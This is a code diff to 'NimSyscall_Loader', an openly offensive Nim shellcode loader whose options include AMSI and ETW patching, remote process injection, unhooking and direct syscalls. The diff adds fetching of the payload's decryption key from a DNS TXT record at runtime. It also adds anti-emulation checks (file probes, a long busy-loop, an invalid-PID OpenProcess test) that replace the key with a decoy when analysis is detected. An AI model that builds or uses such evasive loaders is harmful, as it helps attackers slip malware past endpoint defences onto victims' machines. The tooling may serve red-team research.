@@ -67,7 +67,7 @@ let helpmenu = """
 NimSyscall_Loader v 2.1
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --Caro-Kann --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -80,6 +80,8 @@ Options:
   --file filename  File to encrypt.
   --key key     Key to encrypt with
     --keyfile keyfile  File to read key from
+    --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
+      --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
@@ -155,6 +157,7 @@ Options:
                  This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
   --noAntidebug    Leave out AntiDebugger Checks
   --noDefaultSandBox    Leave out default Sandbox Checks
+  --noAntiEmulate    Leave out AntiEmulation Checks
   --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
     --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
     --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
@@ -224,7 +227,7 @@ var
     outfile: string = packerPath
     envkey: string = rndStr(rand(10..35))
     usekeyFile: bool = false
-    dnsKey: bool = false
+    usednsKey: bool = false
     webKey: bool = false
     dll_out: bool = false
     dllfunc: string = ""
@@ -253,6 +256,8 @@ var
     shellcodeFile: seq[string] = @["enc.blob"]
     keyFile: seq[string] = @["key.txt"]
     kfile: string = ""
+    dnsdomain: string = ""
+    customKey: bool = false
     stegofile: string = ""
     useStego: bool = false
     stFile: string = ""
@@ -340,6 +345,7 @@ var
     stombFunc: string = "MemProtectHeapUnprotectCurrentThread"
     stombFunc2: string = "DllCanUnloadNow"
     restore: bool = false
+    noAntiEmulate: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
 
@@ -351,6 +357,7 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+  customKey = true
 
 if args["--stegofile"]:
     useStego = true
@@ -367,6 +374,9 @@ if args["--ruy-lopez"]:
 
 if args["--noDefaultSandBox"]:
     defaultSandBoxChecks = false
+
+if args["--noAntiEmulate"]:
+    noAntiEmulate = true
 
 if args["--psout"]:
     psout = true
@@ -455,6 +465,21 @@ if args["--keyfile"]:
     kfile = fmt"{keyFilestring}"
     keyFile = kfile.split(',')
 
+if args["--dnsdomain"]:
+    let dnsdomainstring = args["--dnsdomain"]
+    dnsdomain = fmt"{dnsdomainstring}"
+    usednsKey = true
+    webKey = false
+    usekeyFile = false
+
+if args["--dnsKey"]:
+    usednsKey = true
+    webKey = false
+    usekeyFile = false
+    # if dnsdomain == "" quit and tell the user to specify a domain
+    if(dnsdomain == ""):
+        echo "Please specify a domain to retrieve the key from with --dnsdomain"
+        quit(0)
 
 if args["--shellcodeURL"]:
     retrieveFromURL = true
@@ -1955,6 +1980,10 @@ macro obf*(s: untyped): untyped =
     else:
         result = s
 
+when defined(dnsKey):
+    from winim import PDNS_RECORD,DNS_RECORD,DNS_STATUS,DNS_QUERY_STANDARD,DNS_TYPE_TEXT,DnsQueryW
+    var envkey,envkey2: string
+    #proc DnsQueryW*(pszName: LPCWSTR, wType: WORD, Options: DWORD, pExtra: PVOID, ppQueryResults: PVOID, pReserved: PVOID): DWORD {.importc, dynlib: obf("dnsapi.dll"), stdcall, discardable.}
 when not defined(DInvoke):
     proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
         importc: obf("LdrLoadDll"), dynlib: obf("ntdll"), stdcall, discardable.}
@@ -2189,7 +2218,35 @@ when defined(noKey):
         var envkey = keyString
         var envkey2 = envkey
     when defined(dnsKey):
-        # Todo: Implement DNS Key
+        # retrieve key from a domain TXT record via dns request using DnsQuery Win32 API. The domain is dnsdomain
+        var dnsdomain: string = obf("{dnsdomain}")
+        var recordType: WORD = 0x0010 # DNS_TYPE_TEXT
+        var pDnsRecord: PDNS_RECORD = nil
+
+        var dnsStatus: DNS_STATUS = DnsQueryW(dnsdomain, recordType, DNS_QUERY_STANDARD, nil, addr pDnsRecord, nil)
+        if dnsStatus != 0:
+            when defined(verbose):
+                echo obf("[-] DnsQueryW failed with error code: ") & $dnsStatus
+            quit(1)
+        else:
+            when defined(verbose):
+                echo obf("[*] DnsQueryW successful")
+        
+        while(pDnsRecord != nil):
+            if pDnsRecord.wType == DNS_TYPE_TEXT:
+                var dnsKey: string = $pDnsRecord.Data.TXT.pStringArray[0]
+                when defined(verbose):
+                    echo obf("[*] Key: ") & dnsKey
+                envkey = dnsKey
+                envkey2 = envkey
+                break
+            else:
+                when defined(verbose):
+                    echo obf("[-] No TXT record found for domain: ") & dnsdomain
+            pDnsRecord = pDnsRecord.pNext
+        if pDnsRecord == nil:
+            when defined(verbose):
+                echo obf("[-] No TXT record found for domain: ") & dnsdomain
         echo ""
     when defined(webKey):
         # Todo: Implement Web Key
@@ -2323,9 +2380,11 @@ proc accelerated_sleep*(): void =
         when defined(verbose):
             echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
         when not defined(AntiDebug):
-            envkey2 = envkey & "{lastFour}"
+            when not defined(customKey): # Key retrieved from DNS, than we don't want to change it
+                envkey2 = envkey & "{lastFour}"
         else:
-            envkey2 = envkey2 & "{lastTwo}"
+            when not defined(customKey):
+                envkey2 = envkey2 & "{lastTwo}"
         when defined(verbose):
             echo obf("[*] Final Key: ") & envkey2
 accelerated_sleep()
@@ -2334,16 +2393,17 @@ accelerated_sleep()
 let AntiEmulateStub * = """
 
 #from os import fileExists
+#from winim import GetFileAttributesA
 
-proc GetFileAttributesA(path: string): DWORD {.importc, dynlib: "kernel32.dll".}
+proc GetFileAttributesW(path: LPCWSTR): DWORD {.importc, dynlib: "kernel32.dll".}
 
 proc officeFileCheck(): void =
     # check if the file "C:\Program Files\Microsoft Office\AppXManifest.xml" exists
     var fileCount: int = 0
     var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
     var dwAttributes: DWORD
-    dwAttributes = GetFileAttributesA(cast[LPCSTR](AppXManifest))
-    if (dwAttributes != INVALID_FILE_ATTRIBUTES) and ((dwAttributes and FILE_ATTRIBUTE_DIRECTORY) == 0):
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](newWideCString(AppXManifest)))
+    if (dwAttributes != INVALID_FILE_ATTRIBUTES):
         fileCount += 1
         when defined(verbose):
             echo obf("[*] File: ") & AppXManifest & obf(" exists")
@@ -2353,7 +2413,7 @@ proc officeFileCheck(): void =
     else:
         # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
         var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
-        dwAttributes = GetFileAttributesA(cast[LPCSTR](RappelZapp))
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](newWideCString(RappelZapp)))
         if dwAttributes != INVALID_FILE_ATTRIBUTES:
             fileCount += 1
             when defined(verbose):
@@ -2361,8 +2421,20 @@ proc officeFileCheck(): void =
         elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
             when defined(verbose):
                 echo obf("[*] File: ") & RappelZapp & obf(" does not exist")
-        
-    if fileCount == 2:
+    
+    # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
+    var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
+    var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
+
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](newWideCString(WindowsApps))) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](newWideCString(WindowsApps2)))):
+        fileCount += 1
+        when defined(verbose):
+            echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
+    else:
+        when defined(verbose):
+            echo obf("[*] File: ") & WindowsApps & obf(" and ") & WindowsApps2 & obf(" do not exist")
+
+    if fileCount == 3:
         when defined(verbose):
             echo obf("[*] Two many files found...")
         envkey = obf("aetschibaetsch")
@@ -2374,6 +2446,34 @@ proc officeFileCheck(): void =
             echo obf("[*] No false answer to files being checked, continuing...")
 
 officeFileCheck()
+
+# the following function will perform ten billion increments on a variable
+proc billionIncrements(): void =
+    var a: int = 0
+    for i in 0 .. 10000000000:
+        a += 1
+    when defined(verbose):
+        echo obf("[*] Final value of a: ") & $a
+
+billionIncrements()
+
+proc OpenProcess(ProcessAccess: DWORD, bInheritHandle: BOOL, ProcessId: int64): HANDLE {.importc, dynlib: "kernel32.dll".}
+
+# Open process with id of 0xFFFFFFFF1 which is more than the MAX value of a DWORD. If that succeeds, we are in an emulated environment.
+proc OpenMoreMaxPIDProcess(): void =
+    var hProcess: HANDLE = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0xFFFFFFFF1)
+    if hProcess != 0:
+        when defined(verbose):
+            echo obf("[*] OpenProcess with PID 0xFFFFFFFF1 succeeded, we are in an emulated environment")
+        envkey = obf("aetschibaetsch")
+        envkey2 = envkey
+        when defined(verbose):
+            echo obf("[*] Final Key: ") & envkey2
+    else:
+        when defined(verbose):
+            echo obf("[*] OpenProcess with PID 0xFFFFFFFF1 failed, we are not in an emulated environment")
+
+OpenMoreMaxPIDProcess()
 
 
 """
@@ -2955,12 +3055,15 @@ else:
                 when defined(verbose):
                     echo obf("[*] No strange interrupts detected...")
                 when defined(SkipDefaultSandBoxChecks):
-                    envkey2 = envkey & "{lastFour}"
-                else:    
-                    envkey2 = envkey & "{fourthtosecondlast}"
+                    when not defined(customKey): # Key retrieved from DNS, than we don't want to change it
+                        envkey2 = envkey & "{lastFour}"
+                else:
+                    when not defined(customKey):    
+                        envkey2 = envkey & "{fourthtosecondlast}"
             else:
                 when defined(verbose):
                     echo obf("[*] Strange Interrupt Detected, quit.")
+                envkey2 = obf("aetschibaetsch")
     else:
         quit(1)
 
@@ -2992,6 +3095,7 @@ proc CheckHardwareBreakPoints(): bool =
                 echo obf("\r\n[*] No Hardware Breakpoints Detected, continuing...\r\n")
     else:
         status = false
+        envkey2 = obf("aetschibaetsch")
 
     result = status
 
@@ -3079,6 +3183,7 @@ if (apihide):
 
 if(defaultSandBoxChecks):
     stub.add(Accelerated_sleepStub)
+if(not noAntiEmulate):
     stub.add(AntiEmulateStub)
 
 if(gosleep or remoteETWpatch or remoteAMSIpatch):
@@ -3487,9 +3592,17 @@ elif (retrieveFromURL):
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
 
-if(usekeyFile or dnsKey or webKey):
+if(customKey):
+    basicCompileFlags.add("-d:customKey ")
+
+if(usekeyFile or usednsKey or webKey):
     basicCompileFlags.add("-d:noKey ")
-    basicCompileFlags.add("-d:keyFromFile ")
+    if(useKeyFile):
+        basicCompileFlags.add("-d:keyFromFile ")
+    elif(usednsKey):
+        basicCompileFlags.add("-d:dnsKey ")
+    elif(webKey):
+        basicCompileFlags.add("-d:webKey ")
 
 if(stomb):
     basicCompileFlags.add("-d:stomb ")
